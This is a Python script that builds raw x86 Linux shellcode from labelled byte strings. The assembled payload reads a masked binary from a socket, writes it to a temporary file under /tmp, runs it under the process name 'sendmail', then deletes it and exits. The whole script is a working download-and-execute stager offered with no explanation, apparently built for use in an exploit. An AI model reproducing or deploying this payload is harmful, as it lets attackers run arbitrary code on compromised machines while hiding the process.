#!/usr/bin/python

start = \
   "\xe9\x05\x01\x00\x00"

picBegin = \
   "\x5f"

close = \
   "\x31\xc9\xb1\x03"

closeLoop = \
   "\x49\x89\xcb\x31\xc0\xb0\x06\xcd\x80\x80\xf9\x01\x75\xf2"

readSize = \
   "\x31\xd2\xb2\x04\x8d\x8f\x01\x00\x00\x00\x31\xdb\x31\xc0\xb0\x03"\
   "\xcd\x80\x3c\x04\x0f\x85\xb7\x00\x00\x00\x8b\x87\x01\x00\x00\x00"\
   "\x31\xdb\x39\xd8\x0f\x84\x92\x00\x00\x00"

openFile = \
   "\x31\xd2\x66\xba\xff\x01\x31\xc9\x66\xb9\x41\x02\x8d\x9f\x05\x00"\
   "\x00\x00\x31\xc0\xb0\x05\xcd\x80\x31\xdb\x39\xd8\x0f\x8e\x85\x00"\
   "\x00\x00"

readSocket = \
   "\x89\xc6\x8b\x8f\x01\x00\x00\x00"

rwLoop = \
   "\x89\x8f\x01\x00\x00\x00\x31\xd2\xb2\x01\x89\xe1\x31\xdb\x31\xc0"\
   "\xb0\x03\xcd\x80\x31\xdb\x39\xd8\x74\x1b\x7c\x4c"

applyMask = \
   "\x8a\x17\x30\x11"

writeFile = \
   "\x89\xf3\xe8\x6c\x00\x00\x00\x31\xdb\x39\xd8\x7c\x3b\x8b\x8f\x01"\
   "\x00\x00\x00\xe2\xcb"

closeFile = \
   "\x89\xf3\x31\xc0\xb0\x06\xcd\x80"

execve = \
   "\x8d\x8f\x01\x00\x00\x00\xe8\x43\x00\x00\x00\x31\xc0\x8d\x9f\x05"\
   "\x00\x00\x00\x8d\x8f\x15\x00\x00\x00\x50\x51\x89\xe1\x8d\x97\x1e"\
   "\x00\x00\x00\x50\x52\x89\xe2\xb0\x0b\xcd\x80"

unlinkFile = \
   "\x6a\xff\x89\xe1\xe8\x1a\x00\x00\x00\x8d\x9f\x05\x00\x00\x00\x31"\
   "\xc0\xb0\x0a\xcd\x80"

exit = \
   "\x31\xdb\x31\xc0\xb0\x06\xcd\x80\x31\xc0\xb0\x01\xcd\x80"

write4 = \
   "\x31\xd2\xb2\x04\x31\xdb\xeb\x04"

write1 = \
   "\x31\xd2\xb2\x01"

write = \
   "\x31\xc0\xb0\x04\xcd\x80\xc3"

callBackwards = \
   "\xe8\xf6\xfe\xff\xff"

# mask
data = \
   "\xff"

size = \
   "\xff\xff\xff\xff"

tmpnam = \
   "\x2f\x74\x6d\x70\x2f\x66\x69\x6c\x65\x64\x70\x4c\x42\x64\x36\x00"

argv = \
   "\x73\x65\x6e\x64\x6d\x61\x69\x6c\x00"

env = \
   "\x49\x3d\x30\x00"

def build():
   tmp = \
      start + \
      picBegin + \
      close + \
      closeLoop + \
      readSize + \
      openFile + \
      readSocket + \
      rwLoop + \
      applyMask + \
      writeFile + \
      closeFile + \
      execve + \
      unlinkFile + \
      exit + \
      write4 + \
      write1 + \
      write + \
      callBackwards + \
      data + \
      size + \
      tmpnam + \
      argv + \
      env
   return tmp
